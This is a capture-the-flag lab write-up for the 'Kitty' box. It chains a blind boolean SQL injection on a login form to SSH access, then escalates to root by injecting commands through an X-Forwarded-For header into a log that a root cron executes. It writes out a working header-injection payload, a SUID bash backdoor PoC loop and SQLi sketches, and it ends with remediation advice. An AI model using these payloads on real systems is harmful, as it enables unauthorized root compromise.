TL;DR

A blind boolean SQL injection on the web login yields credentials for kitty. On-box discovery reveals a dev web instance bound to 127.0.0.1:8080 and a root cron that shells each logged line. By forcing the app to write an attacker-controlled X-Forwarded-For entry, the cron executes a payload as root, creating a SUID copy of /bin/bash. The SUID bash spawns a root shell and reveals /root/root.txt.

Intro — what I learned while hacking Kitty

Kitty is a compact box that demonstrates how an imperfect defense (blacklist-based detection) plus a convenience script run as root can turn into a full compromise. The SQLi was recoverable via blind boolean enumeration, but the escalation pivot — logging → root cron → sh execution — is the most interesting lesson. Assume headers and any client-controlled fields are malicious; logs or helper scripts that process them must be treated as high-risk.

Environment & notes

Commands alternate between your attacking machine and the compromised kitty account on the box.

Replace $IP with the target IP or export it first:

export IP=10.201.23.142


The development instance listens on 127.0.0.1:8080. Do not send the payload to the remote IP from your host — run curl on the box as kitty so it hits the local dev instance.

High-level flow

nmap discovery: SSH (22) and HTTP (80).

Web app: registration + login; blacklist-based SQLi detection writes X-Forwarded-For to the dev log.

Blind boolean SQLi on login → enumerate DB → recover kitty password → SSH as kitty.

On the box: dev app on 127.0.0.1:8080 and a root cron /opt/log_checker.sh.

Dev app writes X-Forwarded-For into /var/www/development/logged; cron runs each line with sh as root → command injection.

Exploit: as kitty, curl localhost:8080 with X-Forwarded-For: ;cp /bin/bash /tmp/bckdr && chmod 4755 /tmp/bckdr; → cron executes → SUID bash at /tmp/bckdr → spawn root shell → read /root/root.txt.

1) Initial enumeration

Quick TCP service scan:

sudo nmap -sV -p- $IP


Manual browsing: http://$IP/
Directory enumeration:

gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt


Observed ports: 22/tcp (ssh), 80/tcp (http).

2) Web: account creation & probing

Register an account and fuzz the login inputs.

The app has a blacklist-based SQLi detector that returns a distinct message like:
“SQL Injection detected. This incident will be logged!”
When triggered, the dev instance logs the client X-Forwarded-For header to /var/www/development/logged.

The username parameter accepts injection patterns, but filtering pushes enumeration using blind boolean SQLi (character-by-character extraction).

Blind boolean SQLi (concept)
Craft boolean queries that return different responses for true vs false. Automate character-by-character extraction to enumerate:

database name

tables

columns

kitty’s password

Sketch of the approach (conceptual):

CMD_WRAPPER = "UNION SELECT 1,1,1,{};"
# send username: f"'{CMD_WRAPPER.format(cmd)}-- -"
# detect success by checking for a development landing string in the response


After enumeration, recover the kitty password and SSH into the box.

3) Foothold — SSH as kitty
ssh kitty@$IP
# enter recovered password
id
cat /home/kitty/user.txt   # user flag

4) Local enumeration & discovery

As kitty:

Find listening services (note 127.0.0.1:8080):

ss -tlnp


Inspect web files:

ls -la /var/www/
cat /var/www/development/index.php


Optional: copy pspy64 to the box to observe cron runs:

# from attacker:
scp pspy64 kitty@$IP:/tmp
# on the box:
 /tmp/pspy64


Key findings

A root cron periodically executes /opt/log_checker.sh.

/opt/log_checker.sh reads /var/www/development/logged and executes each line through sh, appending output to /root/logged.

The dev index.php writes $_SERVER['HTTP_X_FORWARDED_FOR'] into /var/www/development/logged when the blacklist triggers.

/opt/log_checker.sh (readable by kitty):

#!/bin/sh
while read ip; do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged


The problematic bit is the use of sh -c "echo $ip >> /root/logged" — it interpolates untrusted input into a shell command executed as root.

5) Privilege escalation — exploit the cron + dev app

Why this works: The dev app logs attacker-controlled header data to a file that a root cron reads and shells. That chain turns header text into root-executed commands.

Exploit (run on the box as kitty):

curl -sS localhost:8080/index.php \
  -d 'password=sleep' \
  -H "X-Forwarded-For: ;cp /bin/bash /tmp/bckdr && chmod 4755 /tmp/bckdr;"


Wait for the cron to process /var/www/development/logged (or use pspy to observe). Then:

ls -l /tmp/bckdr
/tmp/bckdr -p   # spawn a root shell via SUID bash
id
cat /root/root.txt


Important: The curl must be executed from the box so the dev instance writes to the same logged file that the root cron reads.

6) PoC one-liner (run on the box)

A compact PoC that sends the payload then polls for the SUID binary:

curl -sS localhost:8080/index.php -d 'password=sleep' \
  -H "X-Forwarded-For: ;cp /bin/bash /tmp/bckdr && chmod 4755 /tmp/bckdr;"

for i in {1..30}; do
  if [ -f /tmp/bckdr ] && [ -u /tmp/bckdr ]; then
    /tmp/bckdr -p || /tmp/bckdr
    break
  fi
  sleep 2
done

7) Remediation & mitigation

Never pass untrusted input to a shell. Replace sh -c "echo $ip >> ..." with safe file operations (open/write) or properly escape input.

Avoid blacklist-based filters — they’re brittle. Use prepared statements / parameterized queries for SQL.

Don’t run scripts as root that process user-writable files; drop privileges or run under a dedicated low-privileged user.

Sanitize logs — headers are attacker-controlled. Sanitize or escape them before writing to files that privileged processes will read.

Harden cron scripts — avoid sh -c with interpolated content. If a shell is necessary, pass arguments safely.

8) IOCs / Artifacts

SUID binary: /tmp/bckdr (copy of /bin/bash with setuid bit).

Logged attacker line in /var/www/development/logged containing the X-Forwarded-For payload.

Cron executed: /opt/log_checker.sh.

Root flag: /root/root.txt.

9) References & tools

TryHackMe — SQLi / blind enumeration techniques (conceptual).

pspy — process monitoring to observe cron activity.

nmap, gobuster, ss, curl — standard enumeration & exploitation tools.

Conclusion — the defensive story

Kitty shows how a partially-implemented defense (blacklisting) combined with an innocuous admin convenience (a root cron that echoes lines) can escalate into full compromise. The SQLi provided initial access, but the real mistake was treating logs and header data as safe input for a root-run shell. Review any automation that reads files writable by unprivileged users — simple helpers can create catastrophic escalation paths.

